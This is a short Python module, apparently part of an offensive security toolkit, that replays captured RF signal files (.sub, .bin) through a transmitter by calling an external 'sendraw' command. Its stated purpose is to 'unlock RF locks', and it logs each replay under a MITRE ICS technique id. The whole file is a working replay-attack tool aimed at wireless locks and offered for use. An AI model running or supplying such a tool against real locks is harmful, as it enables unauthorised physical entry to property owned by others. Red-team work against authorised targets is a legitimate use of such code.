#!/usr/bin/env python3
# modules/attacks/rf_lock_replayer.py

import argparse, os, subprocess, json, time
from datetime import datetime

LOG_FILE = "results/rf_lock_replay_log.json"
MITRE_TTP = "T0851"

def log_attack(filename):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "file_replayed": filename,
        "ttp": MITRE_TTP
    }
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f: data = json.load(f)
    else: data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f: json.dump(data, f, indent=2)

def replay_rf(file, device):
    try:
        subprocess.run(["sendraw", "-r", file, "-d", device], check=True)
        log_attack(file)
        print(f"[✓] RF signal {file} replayed via {device}")
    except Exception as e:
        print(f"[!] Replay failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Replay RF signal to unlock RF locks")
    parser.add_argument("--file", required=True, help="Captured RF file (.sub, .bin)")
    parser.add_argument("--device", default="/dev/rf0", help="Transmission device")
    args = parser.parse_args()
    replay_rf(args.file, args.device)
